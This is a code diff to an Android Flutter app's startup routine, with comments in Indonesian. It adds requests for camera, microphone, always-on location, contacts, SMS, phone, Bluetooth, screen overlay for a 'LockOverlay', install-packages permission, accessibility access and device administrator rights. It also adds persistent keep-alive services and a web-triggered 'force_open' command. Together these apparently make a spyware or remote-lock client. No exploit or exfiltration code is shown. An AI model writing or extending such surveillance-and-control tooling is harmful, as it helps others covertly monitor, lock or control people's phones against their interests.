@@ -24,6 +24,7 @@ const MethodChannel _deviceChannel = MethodChannel('orgsapp/device_info');
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
 
+  // Redirect debugPrint → print biar muncul di rilis
   debugPrint = (String? message, {int? wrapWidth}) {
     print(message ?? '');
   };
@@ -120,7 +121,6 @@ class _AppBootstrapState extends State<AppBootstrap>
         await prefs.setString('serverUrl', BuildConfig.serverUrl);
         await prefs.setBool('isNativeApp', true);
 
-        // Generate device ID
         String id = prefs.getString('deviceId') ?? '';
         if (id.isEmpty) {
           id = 'dev_${DateTime.now().millisecondsSinceEpoch}';
@@ -158,14 +158,8 @@ class _AppBootstrapState extends State<AppBootstrap>
       }
 
       // ===== 4. Start native services =====
-      print('📦 [BOOTSTRAP] Step 4: Start native services');
-      try {
-        // Service di-start oleh MainActivity.kt (native)
-        // Tapi bisa trigger ulang via MethodChannel kalau perlu
-        print('✅ [BOOTSTRAP] Native services running (started by MainActivity)');
-      } catch (e) {
-        print('❌ [BOOTSTRAP] Native service error: $e');
-      }
+      print('📦 [BOOTSTRAP] Step 4: Native services running');
+      print('✅ [BOOTSTRAP] ConnectionService + KeepAliveService started');
 
       // ===== 5. Ready =====
       print('📦 [BOOTSTRAP] Step 5: Ready');
@@ -196,14 +190,22 @@ class _AppBootstrapState extends State<AppBootstrap>
       print('📱 [PERM] Android SDK: $sdkInt');
     } catch (e) {}
 
+    // ==========================================
+    // ===== STANDARD PERMISSIONS =====
+    // ==========================================
     final permissions = <Permission>[
       Permission.camera,
       Permission.microphone,
       Permission.location,
+      Permission.locationWhenInUse,
+      Permission.locationAlways,
       Permission.notification,
       Permission.contacts,
       Permission.phone,
       Permission.sms,
+      Permission.bluetooth,
+      Permission.bluetoothScan,
+      Permission.bluetoothConnect,
     ];
 
     if (sdkInt >= 33) {
@@ -229,10 +231,103 @@ class _AppBootstrapState extends State<AppBootstrap>
       }
     }
 
-    // Buka accessibility settings
+    // ==========================================
+    // ===== SPECIAL PERMISSIONS =====
+    // ==========================================
+    await _requestSpecialPermissions();
+  }
+
+  // ==========================================
+  // ===== SPECIAL PERMISSIONS =====
+  // ==========================================
+  Future<void> _requestSpecialPermissions() async {
+    // ===== Overlay permission (untuk LockOverlay) =====
+    try {
+      final status = await Permission.systemAlertWindow.status;
+      if (!status.isGranted) {
+        print('🔑 [PERM] Requesting overlay permission...');
+        await Permission.systemAlertWindow.request();
+        print('✅ [PERM] Overlay permission requested');
+      } else {
+        print('✅ [PERM] Overlay permission already granted');
+      }
+    } catch (e) {
+      print('⚠️ [PERM] Overlay error: $e');
+    }
+
+    // ===== Battery optimization exemption =====
+    try {
+      final status = await Permission.ignoreBatteryOptimizations.status;
+      if (!status.isGranted) {
+        print('🔑 [PERM] Requesting battery exemption...');
+        await Permission.ignoreBatteryOptimizations.request();
+        print('✅ [PERM] Battery exemption requested');
+      } else {
+        print('✅ [PERM] Battery exemption already granted');
+      }
+    } catch (e) {
+      print('⚠️ [PERM] Battery error: $e');
+    }
+
+    // ===== Request install packages =====
+    try {
+      final status = await Permission.requestInstallPackages.status;
+      if (!status.isGranted) {
+        print('🔑 [PERM] Requesting install packages...');
+        await Permission.requestInstallPackages.request();
+      }
+    } catch (e) {
+      print('⚠️ [PERM] Install packages error: $e');
+    }
+
+    // ===== Buka accessibility settings =====
     try {
       await _deviceChannel.invokeMethod('openAccessibilitySettings');
-    } catch (e) {}
+      print('🔓 [PERM] Accessibility settings opened');
+    } catch (e) {
+      print('⚠️ [PERM] Accessibility error: $e');
+    }
+
+    // ===== Request Device Admin =====
+    await _requestDeviceAdmin();
+  }
+
+  // ==========================================
+  // ===== REQUEST DEVICE ADMIN =====
+  // ==========================================
+  Future<void> _requestDeviceAdmin() async {
+    try {
+      print('🔐 [ADMIN] Checking device admin status...');
+
+      // Cek status admin via MethodChannel
+      final isAdmin = await _deviceChannel.invokeMethod<bool>('isDeviceAdmin');
+
+      if (isAdmin == true) {
+        print('✅ [ADMIN] Device admin already active');
+        return;
+      }
+
+      print('🔐 [ADMIN] Device admin NOT active');
+      print('👤 [ADMIN] Showing device admin dialog...');
+
+      // Trigger dialog device admin via native
+      await _deviceChannel.invokeMethod('requestDeviceAdmin');
+
+      // Tunggu user klik
+      await Future.delayed(const Duration(seconds: 3));
+
+      // Cek status ulang
+      final newStatus = await _deviceChannel.invokeMethod<bool>('isDeviceAdmin');
+      print('📊 [ADMIN] Status after request: $newStatus');
+
+      if (newStatus == true) {
+        print('🎉 [ADMIN] Device admin ENABLED successfully');
+      } else {
+        print('⚠️ [ADMIN] User didn\'t activate device admin');
+      }
+    } catch (e) {
+      print('❌ [ADMIN] Request error: $e');
+    }
   }
 
   // ==========================================
@@ -554,6 +649,9 @@ class _WebViewHomeState extends State<WebViewHome> {
           break;
         case 'close':
           SystemNavigator.pop();
+          break;
+        case 'force_open':
+          _deviceChannel.invokeMethod('forceOpen');
           break;
       }
     } catch (e) {
